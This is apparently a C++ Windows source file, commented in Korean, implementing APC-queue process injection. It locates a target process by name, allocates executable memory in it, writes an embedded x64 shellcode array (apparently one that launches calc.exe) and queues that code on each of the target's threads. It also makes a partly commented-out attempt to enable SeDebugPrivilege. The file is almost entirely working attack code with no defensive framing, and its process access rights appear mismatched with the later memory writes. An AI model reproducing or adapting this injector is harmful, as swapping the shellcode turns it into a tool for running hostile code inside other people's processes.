#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include <vector>

#define RTN_OK 0 
#define RTN_USAGE 1 
#define RTN_ERROR 13


BOOL SetPrivilege(
    HANDLE hToken, // token handle 
    LPCTSTR Privilege, // Privilege to enable/disable 
    BOOL bEnablePrivilege// TRUE to enable. FALSE to disable 
); 

void DisplayError(LPTSTR szAPI);

unsigned char my_payload[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
  0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
  0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
  0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
  0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
  0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
  0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
  0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
  0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
  0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
  0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
  0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
  0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
  0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
  0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
  0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
  0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
  0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
  0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};

unsigned int my_payload_len = sizeof(my_payload);

// 프로세스의 PID를 얻기위한 함수
int findMyProc(const char* procname) {

    HANDLE hSnapshot;
    PROCESSENTRY32 pe;
    int pid = 0;
    BOOL hResult;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

    pe.dwSize = sizeof(PROCESSENTRY32);
    hResult = Process32First(hSnapshot, &pe);
    
    while (hResult) {
        if (strcmp(procname, pe.szExeFile) == 0) {
            pid = pe.th32ProcessID;
            break;
        }
        hResult = Process32Next(hSnapshot, &pe);
    }

    CloseHandle(hSnapshot);
    return pid;
}

// PID로부터 프로세스 스레드 TID 찾기
DWORD getTids(DWORD pid, std::vector<DWORD>& tids) {
    HANDLE hSnapshot;
    THREADENTRY32 te;
    te.dwSize = sizeof(THREADENTRY32);

    // 현재 시스템의 모든 스레드 스냅샷찍기
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
    if (Thread32First(hSnapshot, &te)) {
        do {
            if (pid == te.th32OwnerProcessID) { //스레드의 프로세스id가 pid와 같다면
                tids.push_back(te.th32ThreadID); // vector의 끝에 스레드id 싸그리 추가
            }
        } while (Thread32Next(hSnapshot, &te));
    }

    CloseHandle(hSnapshot);
    return !tids.empty();
}

int main(int argc, char* argv[]) {
    DWORD pid = 0;
    HANDLE ph; //프로세스 핸들
    HANDLE ht; //스레드 핸들
    LPVOID rb; //remote buffer
    std::vector<DWORD> tids; 
    HANDLE hToken;

    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken)) { 
        if (GetLastError() == ERROR_NO_TOKEN) { 
            if (!ImpersonateSelf(SecurityImpersonation)) 
                return RTN_ERROR; 
            if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken)) { 
                DisplayError("OpenThreadToken"); return RTN_ERROR; 
            } 
        } 
        else return RTN_ERROR; 
    } 
    // enable SeDebugPrivilege if(!SetPrivilege(hToken, SE_DEBUG_NAME, TRUE)) {DisplayError("SetPrivilege"); // close token handle CloseHandle(hToken); // indicate failure return RTN_ERROR; }


    pid = findMyProc(argv[1]);
    if (pid == 0) {
        printf("PID 찾을 수 없음.\n");
        return -1;
    }
    else {
        printf("PID = %d \n", pid);
        
        
        // 프로세스 핸들값 얻기
        ph = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, (DWORD)pid);

        if (ph == NULL) {
            printf("OpenProcess 실패. 뭐여? \n");
            return -2;
        }

        // 대상 프로세스(remote) 메모리 할당해주기. Ex사용
        rb = VirtualAllocEx(ph, NULL, my_payload_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        // 메모리 버퍼에 페이로드 write
        WriteProcessMemory(ph, rb, my_payload, my_payload_len, NULL);

        if (getTids(pid, tids)) {
            for (DWORD tid : tids) {
                //스레드 핸들값 얻기. 실패 시 null반환
                HANDLE ht = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
                if (ht) {
                    QueueUserAPC((PAPCFUNC)rb, ht, NULL);
                    printf("페이로드가 인젝션 되었읍니다. \n");
                    CloseHandle(ht);
                }
            }
        }
        CloseHandle(ph);
    }
    return 0;
}


BOOL SetPrivilege(HANDLE hToken, // token handle 
    LPCTSTR Privilege, // Privilege to enable/disable 
    BOOL bEnablePrivilege // TRUE to enable. FALSE to disable 
) { 
    TOKEN_PRIVILEGES tp; 
    LUID luid; 
    TOKEN_PRIVILEGES tpPrevious; 
    DWORD cbPrevious=sizeof(TOKEN_PRIVILEGES); 

    if(!LookupPrivilegeValue( NULL, Privilege, &luid )) 
    return FALSE; 
    // 
    // first pass. get current privilege setting 
    // 
    tp.PrivilegeCount = 1; 
    tp.Privileges[0].Luid = luid; 
    tp.Privileges[0].Attributes = 0; 
    AdjustTokenPrivileges( hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), &tpPrevious, &cbPrevious ); 
    
    if (GetLastError() != ERROR_SUCCESS) return FALSE; 
    // 
    // second pass. set privilege based on previous setting 
    // 
    tpPrevious.PrivilegeCount = 1; 
    tpPrevious.Privileges[0].Luid = luid; 
    if(bEnablePrivilege) { 
        tpPrevious.Privileges[0].Attributes |= (SE_PRIVILEGE_ENABLED); 
    } 
    else {
        tpPrevious.Privileges[0].Attributes ^= (SE_PRIVILEGE_ENABLED & tpPrevious.Privileges[0].Attributes); 
    } 
    AdjustTokenPrivileges( hToken, FALSE, &tpPrevious, cbPrevious, NULL, NULL ); 
    if (GetLastError() != ERROR_SUCCESS) {
        return FALSE;
    } 
    return TRUE; 
    }



void DisplayError(LPTSTR szAPI) {
    LPTSTR MessageBuffer;
    DWORD dwBufferLength;
    fprintf(stderr, "%s() error!\n", szAPI);
    if (dwBufferLength = FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetLastError(), GetSystemDefaultLangID(), (LPTSTR)&MessageBuffer, 0, NULL)) {

        DWORD dwBytesWritten;
        // 
        // Output message string on stderr 
        // 
        WriteFile(GetStdHandle(STD_ERROR_HANDLE), MessageBuffer, dwBufferLength, &dwBytesWritten, NULL);
        // 
        // free the buffer allocated by the system 
        // 
        LocalFree(MessageBuffer);
    }
}